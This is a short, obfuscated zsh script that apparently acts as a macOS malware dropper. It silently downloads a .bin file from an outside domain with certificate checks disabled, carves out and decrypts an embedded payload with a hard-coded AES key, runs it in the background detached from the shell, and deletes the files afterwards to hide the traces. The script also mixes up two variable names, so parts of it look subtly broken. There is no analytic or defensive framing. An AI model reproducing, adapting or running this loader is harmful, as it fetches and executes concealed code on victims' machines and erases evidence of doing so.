#!/bin/zsh
uhzde=$(mktemp /tmp/ju7ztx.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m7841681b4d4355b7.bin" -o "$uhzdez" || exit 1
kwd57h=$(stat -f %z "$uhzdez"); jzsz6xs=$(( kwd57h - 2323 - 1227 ))
tail -c +$(( 2323 + 1 )) "$uhzdez" | head -c $jzsz6xs | openssl enc -d -aes-256-cbc -k cd1f2c690706bf780675f18a -out "$uhzde" 2>/dev/null
[ -s "$uhzde" ] && chmod 700 "$uhzde" && ( "$uhzde" & ) && disown
( sleep 3; rm -f "$uhzde" "$uhzdez" ) &>/dev/null &
